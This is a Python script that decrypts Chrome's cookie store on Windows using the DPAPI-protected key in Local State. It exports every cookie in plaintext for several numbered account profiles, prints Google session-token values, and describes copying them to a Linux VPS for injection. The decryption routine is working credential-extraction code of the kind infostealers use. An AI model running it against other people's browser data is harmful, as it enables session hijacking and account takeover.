"""
Windows Chrome Cookie Decryptor

This script decrypts Chrome cookies on Windows using the encryption key
from Chrome's Local State file.

Chrome v80+ uses AES-256-GCM encryption with a key stored in Local State,
which is itself encrypted with DPAPI.

Requirements:
    pip install pywin32 pycryptodome
"""

import sqlite3
import os
import json
import base64
import shutil
from datetime import datetime, timedelta
import win32crypt  # Windows DPAPI
from Crypto.Cipher import AES  # AES decryption

def get_encryption_key(browser_data_dir):
    """
    Get Chrome's encryption key from Local State file
    
    Chrome stores the encryption key in Local State, encrypted with DPAPI.
    """
    local_state_path = os.path.join(browser_data_dir, 'Local State')
    
    if not os.path.exists(local_state_path):
        print(f"   ⚠️  Local State not found at: {local_state_path}")
        return None
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        # Get encrypted key from Local State
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        
        # Remove 'DPAPI' prefix (first 5 bytes)
        encrypted_key = encrypted_key[5:]
        
        # Decrypt the key using DPAPI
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        return decrypted_key
        
    except Exception as e:
        print(f"   ⚠️  Error getting encryption key: {e}")
        return None

def get_chrome_datetime(chromedate):
    """Convert Chrome timestamp to Python datetime"""
    if chromedate != 0:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except:
            return None
    else:
        return None

def decrypt_windows_cookie(encrypted_value, key):
    """
    Decrypt Chrome cookie using AES-256-GCM
    
    Chrome v80+ uses AES-256-GCM encryption:
    - First 3 bytes: 'v10' or 'v11' version prefix
    - Next 12 bytes: nonce (IV)
    - Rest: encrypted data + auth tag (last 16 bytes)
    - Decrypted data has 32 bytes of metadata, then actual cookie value
    
    Args:
        encrypted_value: The encrypted cookie value (bytes)
        key: The AES encryption key (from Local State)
    
    Returns:
        Decrypted cookie value (string) or None
    """
    try:
        # Check version prefix
        version = encrypted_value[:3]
        
        if version == b'v10' or version == b'v11':
            # Chrome v80+ AES-256-GCM encryption
            
            # Extract nonce (IV) - 12 bytes after version
            nonce = encrypted_value[3:15]
            
            # Extract ciphertext (everything after nonce)
            ciphertext = encrypted_value[15:]
            
            # Create AES-GCM cipher
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            
            # Decrypt (last 16 bytes are auth tag)
            decrypted_value = cipher.decrypt(ciphertext[:-16])
            
            # Skip first 32 bytes (metadata) - actual cookie value starts at byte 32
            decrypted_value = decrypted_value[32:]
            
            # Verify auth tag
            try:
                cipher2 = AES.new(key, AES.MODE_GCM, nonce=nonce)
                cipher2.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
            except:
                pass  # Tag verification optional
            
            return decrypted_value.decode('utf-8')
            
        else:
            # Old DPAPI encryption (Chrome < v80)
            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted_value.decode('utf-8')
            
    except Exception as e:
        # Try fallback to plain DPAPI
        try:
            decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted_value.decode('utf-8')
        except:
            return None

def extract_and_decrypt_cookies(cookies_db_path, browser_data_dir, output_json_path):
    """
    Extract all cookies from Chrome database and decrypt them
    
    Args:
        cookies_db_path: Path to Chrome Cookies SQLite database
        browser_data_dir: Path to browser_data directory (for Local State)
        output_json_path: Path to save decrypted cookies JSON
    """
    
    print("\n" + "=" * 80)
    print("CHROME COOKIE DECRYPTION - Windows AES-256-GCM")
    print("=" * 80)
    
    if not os.path.exists(cookies_db_path):
        print(f"\n❌ Cookie database not found: {cookies_db_path}")
        return False
    
    print(f"\n📁 Source: {cookies_db_path}")
    print(f"💾 Output: {output_json_path}")
    
    # Get encryption key from Local State
    print(f"\n🔑 Getting encryption key from Local State...")
    encryption_key = get_encryption_key(browser_data_dir)
    
    if not encryption_key:
        print(f"❌ Failed to get encryption key!")
        return False
    
    print(f"✅ Encryption key retrieved ({len(encryption_key)} bytes)")
    
    # Make a temporary copy (Chrome locks the file)
    temp_db = cookies_db_path + '.temp'
    try:
        shutil.copy2(cookies_db_path, temp_db)
    except Exception as e:
        print(f"\n❌ Cannot copy database (Chrome may be running): {e}")
        return False
    
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Get all cookies
        cursor.execute("""
            SELECT 
                host_key, name, value, encrypted_value, path, 
                expires_utc, is_secure, is_httponly, creation_utc,
                last_access_utc, has_expires, is_persistent, priority,
                samesite, source_scheme
            FROM cookies
            ORDER BY host_key, name
        """)
        
        cookies = cursor.fetchall()
        conn.close()
        
        print(f"\n📊 Found {len(cookies)} cookies")
        print(f"\n🔓 Decrypting cookies...")
        
        decrypted_cookies = []
        success_count = 0
        failed_count = 0
        
        for cookie in cookies:
            (host_key, name, value, encrypted_value, path, 
             expires_utc, is_secure, is_httponly, creation_utc,
             last_access_utc, has_expires, is_persistent, priority,
             samesite, source_scheme) = cookie
            
            # Decrypt the cookie value
            if encrypted_value:
                decrypted_value = decrypt_windows_cookie(encrypted_value, encryption_key)
                if decrypted_value:
                    success_count += 1
                else:
                    failed_count += 1
                    decrypted_value = value  # Fallback to plain value
            else:
                decrypted_value = value
                success_count += 1
            
            # Convert timestamps to readable format
            expires_date = get_chrome_datetime(expires_utc)
            creation_date = get_chrome_datetime(creation_utc)
            last_access_date = get_chrome_datetime(last_access_utc)
            
            cookie_data = {
                'host_key': host_key,
                'name': name,
                'value': decrypted_value,
                'path': path,
                'expires_utc': expires_utc,
                'expires_date': expires_date.isoformat() if expires_date else None,
                'is_secure': bool(is_secure),
                'is_httponly': bool(is_httponly),
                'creation_utc': creation_utc,
                'creation_date': creation_date.isoformat() if creation_date else None,
                'last_access_utc': last_access_utc,
                'last_access_date': last_access_date.isoformat() if last_access_date else None,
                'has_expires': bool(has_expires),
                'is_persistent': bool(is_persistent),
                'priority': priority,
                'samesite': samesite,
                'source_scheme': source_scheme
            }
            
            decrypted_cookies.append(cookie_data)
        
        # Save to JSON
        with open(output_json_path, 'w', encoding='utf-8') as f:
            json.dump(decrypted_cookies, f, indent=2, ensure_ascii=False)
        
        print(f"\n✅ Decryption complete!")
        print(f"   Successfully decrypted: {success_count}")
        print(f"   Failed: {failed_count}")
        print(f"\n💾 Saved to: {output_json_path}")
        
        # Show sample Google cookies
        google_cookies = [c for c in decrypted_cookies if 'google' in c['host_key'].lower()]
        print(f"\n🔍 Google-related cookies: {len(google_cookies)}")
        
        # Show critical authentication cookies
        critical_names = ['SID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID']
        print(f"\n🔑 Critical authentication cookies:")
        for cookie in decrypted_cookies:
            if cookie['name'] in critical_names:
                value_preview = cookie['value'][:50] + '...' if len(cookie['value']) > 50 else cookie['value']
                print(f"   • {cookie['name']} ({cookie['host_key']})")
                print(f"     Value: {value_preview}")
        
        # Cleanup
        os.remove(temp_db)
        
        return True
        
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
        
        if os.path.exists(temp_db):
            os.remove(temp_db)
        
        return False


def decrypt_all_accounts():
    """Decrypt cookies from all browser_data accounts"""
    
    base_dir = os.path.dirname(__file__)
    browser_data_base = os.path.join(base_dir, 'browser_data')
    output_dir = os.path.join(base_dir, 'decrypted_cookies')
    
    os.makedirs(output_dir, exist_ok=True)
    
    print("\n" + "=" * 80)
    print("BATCH COOKIE DECRYPTION - All Accounts")
    print("=" * 80)
    
    if not os.path.exists(browser_data_base):
        print(f"\n❌ No browser_data directory found")
        return
    
    # Find all account directories
    account_dirs = [d for d in os.listdir(browser_data_base) if d.isdigit()]
    account_numbers = sorted([int(d) for d in account_dirs])
    
    if not account_numbers:
        print(f"\n❌ No accounts found")
        return
    
    print(f"\n📋 Found {len(account_numbers)} account(s): {account_numbers}")
    
    success_count = 0
    
    for account_num in account_numbers:
        browser_data_account = os.path.join(browser_data_base, str(account_num))
        cookies_db = os.path.join(browser_data_account, 'Default', 'Network', 'Cookies')
        
        # Try with .sqlite extension if base name doesn't exist
        if not os.path.exists(cookies_db):
            cookies_db = cookies_db + '.sqlite'
        
        if not os.path.exists(cookies_db):
            print(f"\n⚠️  Account {account_num}: Cookie database not found")
            continue
        
        output_json = os.path.join(output_dir, f'account_{account_num}_cookies.json')
        
        print(f"\n{'=' * 80}")
        print(f"Account {account_num}")
        print(f"{'=' * 80}")
        
        if extract_and_decrypt_cookies(cookies_db, browser_data_account, output_json):
            success_count += 1
    
    print("\n\n" + "=" * 80)
    print("BATCH DECRYPTION COMPLETE")
    print("=" * 80)
    print(f"\n✅ Successfully decrypted: {success_count}/{len(account_numbers)} accounts")
    print(f"\n📁 Decrypted cookies saved in: {output_dir}")
    print(f"\n📋 Next steps:")
    print(f"   1. Copy '{output_dir}' to your Linux VPS")
    print(f"   2. Run the cookie injection script on Linux")
    print(f"   3. Cookies will be imported into Linux Chrome")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        # Decrypt specific account
        account_num = sys.argv[1]
        browser_data_account = rf"D:\Tokenade\browser_data\{account_num}"
        cookies_db = os.path.join(browser_data_account, 'Default', 'Network', 'Cookies')
        
        if not os.path.exists(cookies_db):
            cookies_db = cookies_db + '.sqlite'
        
        output_json = rf"D:\Tokenade\decrypted_cookies\account_{account_num}_cookies.json"
        os.makedirs(os.path.dirname(output_json), exist_ok=True)
        
        extract_and_decrypt_cookies(cookies_db, browser_data_account, output_json)
    else:
        # Decrypt all accounts
        decrypt_all_accounts()
